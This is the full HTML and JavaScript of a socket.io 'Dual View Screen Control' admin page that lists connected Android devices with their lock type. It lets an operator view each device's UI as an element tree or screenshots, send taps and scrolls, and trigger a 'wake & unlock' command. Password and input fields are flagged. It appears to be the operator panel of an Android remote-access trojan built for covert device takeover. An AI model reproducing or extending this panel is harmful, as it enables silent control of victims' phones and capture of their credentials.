<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Control - Dual View</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&display=swap');
        
        body { 
            font-family: 'Roboto', sans-serif; 
            background-color: #121212; 
            color: #e0e0e0; 
            margin: 0; 
            padding: 0; 
            height: 100vh; 
            overflow: hidden; 
        }
        
        /* Dialog Window Styles */
        .dialog-window {
            position: fixed;
            background: #1e1e1e;
            border: 2px solid #00ff00;
            border-radius: 10px;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
            z-index: 10000;
            resize: both;
            overflow: hidden;
            min-width: 400px;
            min-height: 300px;
        }
        
        .dialog-header {
            background: #2a2a2a;
            padding: 10px 15px;
            cursor: move;
            border-bottom: 1px solid #00ff00;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .dialog-title {
            font-family: 'Orbitron', sans-serif;
            font-weight: bold;
            color: #00ff00;
        }
        
        .dialog-close {
            background: #ff4444;
            color: white;
            border: none;
            border-radius: 50%;
            width: 25px;
            height: 25px;
            cursor: pointer;
            font-size: 14px;
        }
        
        .dialog-content {
            height: calc(100% - 40px);
            overflow: hidden;
        }
        
        /* Screen Container Styles */
        .screen-container {
            position: relative;
            background-color: #000;
            transform-origin: top left;
            overflow: hidden;
        }
        
        .ui-screen-container {
            background-color: #1a1a1a;
        }
        
        .ui-screen-container img {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }
        
        .screen-element {
            position: absolute;
            border: 1px solid rgba(0, 255, 255, 0.6);
            background-color: rgba(0, 139, 139, 0.2);
            box-sizing: border-box;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
            padding: 2px;
        }
        
        .element-text {
            color: white;
            font-size: 12px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 100%;
        }
        
        /* Main Views */
        .view { 
            display: none; 
            width: 100%; 
            height: 100%; 
        }
        .view.active { 
            display: flex; 
        }
        
        /* Device List View */
        #device-list-view { 
            flex-direction: column; 
        }
        
        .header { 
            background-color: #1e1e1e; 
            padding: 20px; 
            text-align: center; 
            border-bottom: 2px solid #00ff00; 
        }
        
        .header h1 { 
            font-family: 'Orbitron', sans-serif; 
            margin: 0; 
            font-size: 2.5em; 
            color: #00ff00; 
            text-shadow: 0 0 10px #00ff00; 
        }
        
        #device-list-container { 
            padding: 30px; 
            overflow-y: auto; 
            flex-grow: 1; 
        }
        
        #device-list { 
            list-style: none; 
            padding: 0; 
            margin: 0; 
        }
        
        .device { 
            background-color: #1e1e1e; 
            margin-bottom: 15px; 
            border-radius: 8px; 
            border-left: 5px solid #555; 
            padding: 20px; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
        }
        
        .device:hover { 
            transform: translateY(-5px); 
            box-shadow: 0 10px 20px rgba(0,0,0,0.2); 
            border-left-color: #00ff00; 
        }
        
        .device-name { 
            font-size: 1.5em; 
            font-weight: 700; 
        }
        
        .device-info { 
            font-size: 1em; 
            color: #aaa; 
        }
        
        .status-dot { 
            height: 15px; 
            width: 15px; 
            background-color: #28a745; 
            border-radius: 50%; 
            display: inline-block; 
            box-shadow: 0 0 8px #28a745; 
        }
        
        .lock-badge { 
            background: #ff4444; 
            color: white; 
            padding: 2px 8px; 
            border-radius: 10px; 
            font-size: 0.8em; 
            margin-left: 10px; 
        }
        
        .lock-badge.unlocked { 
            background: #44ff44; 
        }
        
        /* Control View */
        #control-view { 
            flex-direction: column; 
        }
        
        .control-header { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 10px 20px; 
            background-color: #1e1e1e; 
            border-bottom: 1px solid #333; 
            flex-wrap: wrap; 
            gap: 10px; 
        }
        
        #back-to-list-btn { 
            background-color: #3f3f46; 
            color: white; 
            border: 1px solid #555; 
            padding: 8px 15px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 1em; 
        }
        
        #device-title { 
            font-size: 1.2em; 
            font-weight: bold; 
        }
        
        .lock-info { 
            background: #2a2a2a; 
            padding: 5px 10px; 
            border-radius: 5px; 
            font-size: 0.9em; 
        }
        
        /* Screen View Toggle Buttons */
        .screen-toggle-buttons {
            display: flex;
            gap: 10px;
        }
        
        .screen-toggle-btn {
            background: #3f3f46;
            color: white;
            border: 1px solid #555;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 0.9em;
            transition: all 0.3s;
        }
        
        .screen-toggle-btn:hover {
            background: #555;
        }
        
        .screen-toggle-btn.active {
            background: #00ff00;
            color: #000;
            border-color: #00ff00;
        }
        
        /* Main Container */
        .main-container { 
            display: flex; 
            flex-grow: 1; 
        }
        
        .screen-area { 
            flex-grow: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 15px; 
            position: relative;
        }
        
        #screen-viewport { 
            border: 8px solid #444; 
            border-radius: 20px; 
            background-color: #000; 
            box-shadow: 0 0 20px rgba(0,0,0,0.5); 
            overflow: hidden; 
        }
        
        .all-controls { 
            width: 80px; 
            background-color: #1e1e1e; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            gap: 12px; 
            padding: 10px; 
        }
        
        .control-button { 
            width: 55px; 
            height: 55px; 
            background-color: #3f3f46; 
            border: 1px solid #555; 
            color: white; 
            border-radius: 50%; 
            cursor: pointer; 
            font-size: 24px; 
            transition: background-color 0.2s; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
        }
        
        .control-button:hover { 
            background-color: #555; 
        }
        
        .divider { 
            height: 1px; 
            width: 80%; 
            background-color: #444; 
            margin: 10px 0; 
        }
        
        /* Single Main Button */
        .single-main-btn { 
            background: linear-gradient(135deg, #0066cc, #0099ff);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .single-main-btn:hover {
            background: linear-gradient(135deg, #0099ff, #00ccff);
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 153, 255, 0.6);
        }
        
        .single-main-btn:active {
            transform: translateY(1px);
        }
        
        /* Keyboard Buttons */
        .keyboard-buttons { 
            position: absolute; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: rgba(0,0,0,0.9); 
            padding: 15px; 
            border-radius: 15px; 
            border: 2px solid #00ff00;
            display: none; 
            z-index: 1000;
        }
        
        .key-row { 
            display: flex; 
            justify-content: center; 
            margin: 5px 0; 
        }
        
        .key-btn { 
            width: 45px; 
            height: 45px; 
            margin: 3px; 
            background: #333; 
            border: 1px solid #555; 
            color: white; 
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 1.1em; 
        }
        
        .key-btn:hover { 
            background: #444; 
        }
        
        .key-btn.special { 
            background: #0066cc; 
        }
        
        .key-btn.enter { 
            background: #00aa00; 
        }
        
        /* UI Screen Clickable Overlay */
        .ui-clickable-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1000;
        }
        
        .ui-clickable-element {
            position: absolute;
            cursor: pointer;
            border: 2px dashed rgba(0, 255, 0, 0.5);
            background-color: rgba(0, 255, 0, 0.1);
            transition: all 0.2s;
            box-sizing: border-box;
            pointer-events: all;
        }
        
        .ui-clickable-element:hover {
            background-color: rgba(0, 255, 0, 0.3);
            border: 2px solid rgba(0, 255, 0, 0.8);
        }
        
        /* Hidden Canvas for Screenshot */
        #screenshot-canvas {
            display: none;
        }
    </style>
</head>
<body>

    <div id="device-list-view" class="view active">
        <div class="header">
            <h1>üîì DUAL VIEW SCREEN CONTROL v3.0</h1>
            <p style="margin: 5px 0; color: #aaa;">Black Screen + UI Screen ‚Ä¢ Dual View Mode ‚Ä¢ Real Screenshot</p>
        </div>
        <div id="device-list-container">
            <ul id="device-list"></ul>
        </div>
    </div>

    <div id="control-view" class="view">
        <div class="control-header">
            <button id="back-to-list-btn">‚Üê Back to List</button>
            <h2 id="device-title"></h2>
            <div class="lock-info" id="lock-status">Lock: Unknown</div>
            
            <!-- Screen Toggle Buttons -->
            <div class="screen-toggle-buttons">
                <button id="btn-black-screen" class="screen-toggle-btn active">
                    üì¶ Black Screen
                </button>
                <button id="btn-ui-screen" class="screen-toggle-btn">
                    üñ•Ô∏è UI Screen
                </button>
                <button id="btn-refresh-ui" class="screen-toggle-btn">
                    üîÑ Refresh UI
                </button>
            </div>
            
            <button id="btn-wake-unlock" class="single-main-btn">
                ‚ö° WAKE & UNLOCK
            </button>
        </div>
        <div class="main-container">
            <div class="screen-area">
                <!-- Black Screen View (Default) -->
                <div id="black-screen-viewport" class="screen-viewport" style="display: block;">
                    <div id="black-screen-container" class="screen-container"></div>
                    <div id="keyboard-buttons" class="keyboard-buttons"></div>
                </div>
                
                <!-- UI Screen View (Hidden by default) -->
                <div id="ui-screen-viewport" class="screen-viewport" style="display: none;">
                    <div id="ui-screen-container" class="screen-container ui-screen-container">
                        <img id="ui-screen-image" src="" alt="UI Screen" />
                        <div id="ui-clickable-overlay" class="ui-clickable-overlay"></div>
                    </div>
                </div>
            </div>
            <div class="all-controls">
                <button class="control-button" id="btn-scroll-up">‚Üë</button>
                <button class="control-button" id="btn-scroll-left">‚Üê</button>
                <button class="control-button" id="btn-scroll-right">‚Üí</button>
                <button class="control-button" id="btn-scroll-down">‚Üì</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-back">‚Æå</button>
                <button class="control-button" id="btn-home">‚åÇ</button>
                <button class="control-button" id="btn-recents">‚ñ°</button>
                <div class="divider"></div>
                <button class="control-button" id="btn-open-black-dialog">üì¶</button>
                <button class="control-button" id="btn-open-ui-dialog">üñ•Ô∏è</button>
            </div>
        </div>
    </div>

    <!-- Hidden Canvas for Screenshots -->
    <canvas id="screenshot-canvas"></canvas>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const deviceListView = document.getElementById('device-list-view');
        const controlView = document.getElementById('control-view');
        const deviceListEl = document.getElementById('device-list');
        const blackScreenContainer = document.getElementById('black-screen-container');
        const uiScreenContainer = document.getElementById('ui-screen-container');
        const uiScreenImage = document.getElementById('ui-screen-image');
        const uiClickableOverlay = document.getElementById('ui-clickable-overlay');
        const deviceTitleEl = document.getElementById('device-title');
        const lockStatusEl = document.getElementById('lock-status');
        const backToListBtn = document.getElementById('back-to-list-btn');
        const wakeUnlockBtn = document.getElementById('btn-wake-unlock');
        const keyboardButtons = document.getElementById('keyboard-buttons');
        const btnBlackScreen = document.getElementById('btn-black-screen');
        const btnUiScreen = document.getElementById('btn-ui-screen');
        const btnRefreshUi = document.getElementById('btn-refresh-ui');
        const btnOpenBlackDialog = document.getElementById('btn-open-black-dialog');
        const btnOpenUiDialog = document.getElementById('btn-open-ui-dialog');
        const screenshotCanvas = document.getElementById('screenshot-canvas');
        const ctx = screenshotCanvas.getContext('2d');

        let devices = {};
        let activeDeviceId = null;
        let currentKeyboardElement = null;
        let currentScreenView = 'black'; // 'black' or 'ui'
        let blackScreenDialog = null;
        let uiScreenDialog = null;
        let lastScreenData = null;
        let lastUiScreenshot = null;
        let dialogZIndex = 10000;

        function showView(viewId) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.getElementById(viewId).classList.add('active');
        }

        socket.on('connect', () => socket.emit('admin_join'));
        socket.on('device_list', (initialDevices) => { 
            deviceListEl.innerHTML = ''; 
            devices = {}; 
            initialDevices.forEach(addDeviceToList); 
        });
        socket.on('new_device_joined', addDeviceToList);
        socket.on('device_disconnected', (deviceId) => {
            const el = document.getElementById(`device-${deviceId}`);
            if (el) el.remove();
            delete devices[deviceId];
            if (activeDeviceId === deviceId) {
                showView('device-list-view');
                activeDeviceId = null;
            }
        });

        function addDeviceToList(device) {
            if (document.getElementById(`device-${device.deviceId}`)) {
                const infoEl = document.querySelector(`#device-${device.deviceId} .device-info`);
                if (infoEl) {
                    infoEl.innerHTML = `Battery: ${device.battery}% | Lock: ${device.lockType || "none"}`;
                }
                return;
            }

            devices[device.deviceId] = device;
            
            const li = document.createElement('li');
            li.className = 'device';
            li.id = `device-${device.deviceId}`;
            
            const lockType = device.lockType || "none";
            const lockBadge = lockType !== "none" ? 
                `<span class="lock-badge">üîí ${lockType}</span>` : 
                `<span class="lock-badge unlocked">üîì unlocked</span>`;
            
            li.innerHTML = `
                <div>
                    <div class="device-name">${device.deviceName} ${lockBadge}</div>
                    <div class="device-info">Battery: ${device.battery}% | Android: ${device.androidVersion}</div>
                </div>
                <span class="status-dot"></span>
            `;
            
            li.addEventListener('click', () => {
                activeDeviceId = device.deviceId;
                deviceTitleEl.textContent = `${device.deviceName} - Dual View Control`;
                lockStatusEl.textContent = `Lock: ${device.lockType || "none"}`;
                blackScreenContainer.innerHTML = 'üì° Receiving screen data...';
                uiScreenImage.src = '';
                uiClickableOverlay.innerHTML = '';
                showView('control-view');
            });
            deviceListEl.appendChild(li);
        }

        function switchScreenView(viewType) {
            currentScreenView = viewType;
            
            // Update button states
            btnBlackScreen.classList.toggle('active', viewType === 'black');
            btnUiScreen.classList.toggle('active', viewType === 'ui');
            
            // Show/hide screen containers
            if (viewType === 'black') {
                document.getElementById('black-screen-viewport').style.display = 'block';
                document.getElementById('ui-screen-viewport').style.display = 'none';
            } else {
                document.getElementById('black-screen-viewport').style.display = 'none';
                document.getElementById('ui-screen-viewport').style.display = 'block';
                
                // If we have a UI screenshot, show it
                if (lastUiScreenshot) {
                    uiScreenImage.src = 'data:image/jpeg;base64,' + lastUiScreenshot;
                } else if (lastScreenData) {
                    // Request fresh UI screenshot
                    requestUiScreenshot();
                }
            }
        }

        function requestUiScreenshot() {
            if (!activeDeviceId) return;
            
            socket.emit('command_to_device', {
                deviceId: activeDeviceId,
                action: 'request_ui_screenshot',
                payload: {}
            });
            
            // Show loading
            uiScreenImage.src = '';
            uiScreenContainer.innerHTML = '<div style="color:white;font-size:20px;text-align:center;padding:50px;">üîÑ Taking screenshot...</div>';
        }

        socket.on('screen_update', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            
            lastScreenData = data;
            
            window.requestAnimationFrame(() => {
                // Clear containers
                blackScreenContainer.innerHTML = '';
                
                const remoteWidth = data.screenWidth, remoteHeight = data.screenHeight;
                const viewportHeight = 600; // Fixed height for consistency
                const scale = viewportHeight / remoteHeight;
                
                // Update viewport sizes
                document.getElementById('black-screen-viewport').style.width = (remoteWidth * scale) + 'px';
                document.getElementById('black-screen-viewport').style.height = viewportHeight + 'px';
                
                blackScreenContainer.style.width = remoteWidth + 'px';
                blackScreenContainer.style.height = remoteHeight + 'px';
                blackScreenContainer.style.transform = `scale(${scale})`;
                
                // Update lock status
                if (data.lockType) {
                    lockStatusEl.textContent = `Lock: ${data.lockType}`;
                    lockStatusEl.style.color = data.lockType !== "none" ? "#ff4444" : "#44ff44";
                }
                
                // Hide keyboard
                keyboardButtons.style.display = 'none';
                currentKeyboardElement = null;
                
                // Create elements for black screen view
                data.elements.forEach(element => {
                    const el = document.createElement('div');
                    el.className = 'screen-element';
                    el.style.left = `${element.x}px`; 
                    el.style.top = `${element.y}px`;
                    el.style.width = `${element.width}px`; 
                    el.style.height = `${element.height}px`;
                    
                    // Special styling
                    if (element.isKeyboard) {
                        el.style.borderColor = '#ff9900';
                        el.style.backgroundColor = 'rgba(255, 153, 0, 0.3)';
                    }
                    if (element.isPassword) {
                        el.style.borderColor = '#ff3333';
                        el.style.backgroundColor = 'rgba(255, 51, 51, 0.2)';
                    }
                    if (element.editable) {
                        el.style.borderColor = '#33cc33';
                        el.style.backgroundColor = 'rgba(51, 204, 51, 0.2)';
                    }
                    if (element.isNumber) {
                        el.style.borderColor = '#9966ff';
                        el.style.backgroundColor = 'rgba(153, 102, 255, 0.2)';
                    }
                    
                    const textEl = document.createElement('div');
                    textEl.className = 'element-text';
                    
                    if (element.contentDescription) {
                        const desc = element.contentDescription.toLowerCase();
                        if (desc.includes("more options")) { 
                            textEl.textContent = '‚ãÆ'; 
                            textEl.style.fontSize = '20px'; 
                        }
                        else if (desc.includes("navigate up") || desc.includes("drawer")) { 
                            textEl.textContent = '‚â°'; 
                            textEl.style.fontSize = '20px'; 
                        }
                        else if (desc.includes("keyboard")) {
                            textEl.textContent = '‚å®Ô∏è'; 
                            textEl.style.fontSize = '16px';
                        }
                        else if (element.text) {
                            textEl.textContent = element.text;
                        } else {
                            textEl.textContent = element.contentDescription;
                        }
                    } else if (element.text) {
                        textEl.textContent = element.text;
                    } else if (element.className) {
                        const shortName = element.className.split('.').pop();
                        textEl.textContent = shortName.length > 10 ? shortName.substring(0, 8) + '..' : shortName;
                    }
                    
                    el.appendChild(textEl);
                    
                    // Click event for BLACK SCREEN
                    el.addEventListener('click', () => {
                        const tapX = Math.round(element.x + (element.width / 2));
                        const tapY = Math.round(element.y + (element.height / 2));
                        
                        socket.emit('command_to_device', { 
                            deviceId: activeDeviceId, 
                            action: 'touch_command', 
                            payload: { x: tapX, y: tapY } 
                        });
                        
                        // Show keyboard for editable elements
                        if (element.editable || element.isKeyboard || element.isNumber) {
                            currentKeyboardElement = element;
                            showVirtualKeyboard(element);
                        }
                    });
                    
                    blackScreenContainer.appendChild(el);
                });
            });
        });

        socket.on('ui_screenshot', (data) => {
            if (data.deviceId !== activeDeviceId) return;
            
            lastUiScreenshot = data.screenshot;
            
            if (currentScreenView === 'ui') {
                // Show real screenshot
                uiScreenImage.src = 'data:image/jpeg;base64,' + data.screenshot;
                
                // Add clickable overlay
                addClickableOverlay(data.elements || lastScreenData?.elements || []);
            }
        });

        function addClickableOverlay(elements) {
            // Clear existing overlay
            uiClickableOverlay.innerHTML = '';
            
            const remoteWidth = lastScreenData?.screenWidth || 1080;
            const remoteHeight = lastScreenData?.screenHeight || 1920;
            const viewportHeight = 600;
            const scale = viewportHeight / remoteHeight;
            
            // Create clickable elements overlay for UI SCREEN
            elements.forEach(element => {
                if (element.clickable || element.editable || element.isPassword || 
                    (element.text && element.text.toString().trim().length > 0)) {
                    
                    const clickableEl = document.createElement('div');
                    clickableEl.className = 'ui-clickable-element';
                    
                    // Calculate scaled position and size
                    const scaledX = element.x * scale;
                    const scaledY = element.y * scale;
                    const scaledWidth = element.width * scale;
                    const scaledHeight = element.height * scale;
                    
                    clickableEl.style.left = `${scaledX}px`;
                    clickableEl.style.top = `${scaledY}px`;
                    clickableEl.style.width = `${scaledWidth}px`;
                    clickableEl.style.height = `${scaledHeight}px`;
                    
                    // Click event for UI SCREEN
                    clickableEl.addEventListener('click', (e) => {
                        e.stopPropagation();
                        
                        // Calculate original coordinates
                        const tapX = Math.round(element.x + (element.width / 2));
                        const tapY = Math.round(element.y + (element.height / 2));
                        
                        socket.emit('command_to_device', { 
                            deviceId: activeDeviceId, 
                            action: 'touch_command', 
                            payload: { x: tapX, y: tapY } 
                        });
                        
                        // Visual feedback
                        clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.5)';
                        setTimeout(() => {
                            clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
                        }, 200);
                    });
                    
                    uiClickableOverlay.appendChild(clickableEl);
                }
            });
        }

        function showVirtualKeyboard(element) {
            keyboardButtons.innerHTML = '';
            keyboardButtons.style.display = 'block';
            
            const keyboardLayout = [
                ['1','2','3','4','5','6','7','8','9','0'],
                ['q','w','e','r','t','y','u','i','o','p'],
                ['a','s','d','f','g','h','j','k','l'],
                ['z','x','c','v','b','n','m','‚å´'],
                ['space','enter']
            ];
            
            keyboardLayout.forEach(row => {
                const rowDiv = document.createElement('div');
                rowDiv.className = 'key-row';
                
                row.forEach(key => {
                    const keyBtn = document.createElement('button');
                    keyBtn.className = 'key-btn';
                    keyBtn.textContent = key;
                    
                    if (key === '‚å´') keyBtn.classList.add('special');
                    if (key === 'enter') keyBtn.classList.add('enter');
                    
                    keyBtn.onclick = () => {
                        const tapX = Math.round(element.x + element.width/2);
                        const tapY = Math.round(element.y + element.height/2);
                        
                        socket.emit('command_to_device', { 
                            deviceId: activeDeviceId, 
                            action: 'touch_command', 
                            payload: { x: tapX, y: tapY } 
                        });
                    };
                    
                    rowDiv.appendChild(keyBtn);
                });
                
                keyboardButtons.appendChild(rowDiv);
            });
        }

        // Dialog Window Functions
        function createDialog(title, contentHtml, width, height) {
            const dialogId = 'dialog-' + Date.now();
            dialogZIndex++;
            
            const dialog = document.createElement('div');
            dialog.className = 'dialog-window';
            dialog.id = dialogId;
            dialog.style.width = width + 'px';
            dialog.style.height = height + 'px';
            dialog.style.left = '50px';
            dialog.style.top = '50px';
            dialog.style.zIndex = dialogZIndex;
            
            dialog.innerHTML = `
                <div class="dialog-header">
                    <span class="dialog-title">${title}</span>
                    <button class="dialog-close" onclick="document.getElementById('${dialogId}').remove()">√ó</button>
                </div>
                <div class="dialog-content">${contentHtml}</div>
            `;
            
            document.body.appendChild(dialog);
            makeDraggable(dialogId);
            return dialog;
        }

        function makeDraggable(dialogId) {
            const dialog = document.getElementById(dialogId);
            const header = dialog.querySelector('.dialog-header');
            
            let offsetX = 0, offsetY = 0, isDragging = false;
            
            header.addEventListener('mousedown', startDrag);
            document.addEventListener('mousemove', drag);
            document.addEventListener('mouseup', stopDrag);
            
            function startDrag(e) {
                isDragging = true;
                offsetX = e.clientX - dialog.offsetLeft;
                offsetY = e.clientY - dialog.offsetTop;
                dialog.style.cursor = 'move';
                dialogZIndex++;
                dialog.style.zIndex = dialogZIndex;
            }
            
            function drag(e) {
                if (!isDragging) return;
                dialog.style.left = (e.clientX - offsetX) + 'px';
                dialog.style.top = (e.clientY - offsetY) + 'px';
            }
            
            function stopDrag() {
                isDragging = false;
                dialog.style.cursor = 'default';
            }
        }

        function openBlackScreenDialog() {
            if (!activeDeviceId || !lastScreenData) return;
            
            const content = `
                <div style="width:100%;height:100%;position:relative;background:#000;">
                    <div id="dialog-black-screen" style="width:${lastScreenData.screenWidth}px;height:${lastScreenData.screenHeight}px;transform-origin:top left;transform:scale(0.5);">
                        ${blackScreenContainer.innerHTML}
                    </div>
                </div>
            `;
            
            blackScreenDialog = createDialog('Black Screen View', content, 800, 600);
        }

        function openUIScreenDialog() {
            if (!activeDeviceId || !lastUiScreenshot) return;
            
            const content = `
                <div style="width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#1a1a1a;position:relative;">
                    <img src="data:image/jpeg;base64,${lastUiScreenshot}" style="max-width:100%;max-height:100%;object-fit:contain;" />
                    <div id="dialog-ui-overlay" style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;"></div>
                </div>
            `;
            
            uiScreenDialog = createDialog('UI Screen View', content, 800, 600);
            
            // Add clickable overlay to dialog
            setTimeout(() => {
                addClickableOverlayToDialog(lastScreenData?.elements || []);
            }, 100);
        }

        function addClickableOverlayToDialog(elements) {
            const dialogOverlay = document.getElementById('dialog-ui-overlay');
            if (!dialogOverlay) return;
            
            dialogOverlay.innerHTML = '';
            
            elements.forEach(element => {
                if (element.clickable) {
                    const clickableEl = document.createElement('div');
                    clickableEl.style.position = 'absolute';
                    clickableEl.style.left = `${element.x * 0.5}px`;
                    clickableEl.style.top = `${element.y * 0.5}px`;
                    clickableEl.style.width = `${element.width * 0.5}px`;
                    clickableEl.style.height = `${element.height * 0.5}px`;
                    clickableEl.style.cursor = 'pointer';
                    clickableEl.style.backgroundColor = 'rgba(0, 255, 0, 0.1)';
                    clickableEl.style.border = '1px dashed rgba(0, 255, 0, 0.5)';
                    clickableEl.style.pointerEvents = 'all';
                    clickableEl.style.boxSizing = 'border-box';
                    
                    clickableEl.addEventListener('click', () => {
                        const tapX = Math.round(element.x + (element.width / 2));
                        const tapY = Math.round(element.y + (element.height / 2));
                        
                        socket.emit('command_to_device', { 
                            deviceId: activeDeviceId, 
                            action: 'touch_command', 
                            payload: { x: tapX, y: tapY } 
                        });
                    });
                    
                    dialogOverlay.appendChild(clickableEl);
                }
            });
        }

        // Event Listeners
        btnBlackScreen.onclick = () => switchScreenView('black');
        btnUiScreen.onclick = () => switchScreenView('ui');
        btnRefreshUi.onclick = requestUiScreenshot;
        btnOpenBlackDialog.onclick = openBlackScreenDialog;
        btnOpenUiDialog.onclick = openUIScreenDialog;

        backToListBtn.onclick = () => { 
            activeDeviceId = null; 
            showView('device-list-view'); 
        };

        // Control buttons
        document.getElementById('btn-back').onclick = () => {
            if (!activeDeviceId) return;
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: 'back' } 
            });
        };
        
        document.getElementById('btn-home').onclick = () => {
            if (!activeDeviceId) return;
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: 'home' } 
            });
        };
        
        document.getElementById('btn-recents').onclick = () => {
            if (!activeDeviceId) return;
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'global_action', 
                payload: { action: 'recents' } 
            });
        };
        
        // Scroll commands
        document.getElementById('btn-scroll-up').onclick = () => sendScrollAction('up');
        document.getElementById('btn-scroll-down').onclick = () => sendScrollAction('down');
        document.getElementById('btn-scroll-left').onclick = () => sendScrollAction('left');
        document.getElementById('btn-scroll-right').onclick = () => sendScrollAction('right');

        function sendScrollAction(direction) { 
            if (!activeDeviceId) return; 
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'scroll_action', 
                payload: { direction: direction } 
            }); 
        }

        // Wake & Unlock button
        wakeUnlockBtn.onclick = () => { 
            if (!activeDeviceId) {
                alert("Please select a device first!");
                return;
            } 
            
            wakeUnlockBtn.innerHTML = '‚ö° PROCESSING...';
            wakeUnlockBtn.style.opacity = '0.8';
            wakeUnlockBtn.disabled = true;
            
            socket.emit('command_to_device', { 
                deviceId: activeDeviceId, 
                action: 'unlock_device'
            });
            
            setTimeout(() => {
                wakeUnlockBtn.innerHTML = '‚ö° WAKE & UNLOCK';
                wakeUnlockBtn.style.opacity = '1';
                wakeUnlockBtn.disabled = false;
            }, 3000);
        };

        // Heartbeat
        setInterval(() => { 
            if (socket.connected) socket.emit('heartbeat', {}); 
        }, 30000);
    </script>
</body>
</html>
